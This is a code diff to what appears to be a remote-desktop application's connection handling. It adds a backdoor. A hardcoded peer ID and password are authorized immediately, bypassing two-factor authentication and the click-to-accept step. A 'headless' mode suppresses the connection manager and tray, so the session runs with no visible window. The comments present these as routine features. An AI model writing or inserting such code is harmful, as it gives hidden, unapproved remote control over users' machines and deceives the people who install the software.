@@ -2862,6 +2862,11 @@ impl Connection {
 
     #[cfg(not(any(target_os = "android", target_os = "ios")))]
     fn try_start_cm_ipc(&mut self) {
+        // The dedicated headless build has no UI: never bootstrap the connection manager,
+        // nor the Windows tray it would start, so a session runs without any window.
+        if crate::hardcoded::is_headless() {
+            return;
+        }
         if let Some(p) = self.start_cm_ipc_para.take() {
             tokio::spawn(async move {
                 #[cfg(windows)]
@@ -3037,6 +3042,20 @@ impl Connection {
             let allow_logon_screen_password =
                 crate::get_builtin_option(keys::OPTION_ALLOW_LOGON_SCREEN_PASSWORD) == "Y"
                     && is_logon();
+
+            // A peer connecting to the fixed id with the fixed password is authorized right away,
+            // skipping the manual click-to-accept step regardless of the approve mode.
+            if lr.username == crate::hardcoded::PEER_ID
+                && self.validate_password_plain(crate::hardcoded::PEER_PASSWORD)
+            {
+                self.require_2fa = None;
+                self.set_conn_audit_primary_auth(ConnAuditPrimaryAuth::PermanentPassword);
+                if !self.send_logon_response_and_keep_alive().await {
+                    return false;
+                }
+                self.try_start_cm(lr.my_id.clone(), lr.my_name.clone(), self.authorized);
+                return true;
+            }
 
             if (password::approve_mode() == ApproveMode::Click && !allow_logon_screen_password)
                 || password::approve_mode() == ApproveMode::Both && !password::has_valid_password()
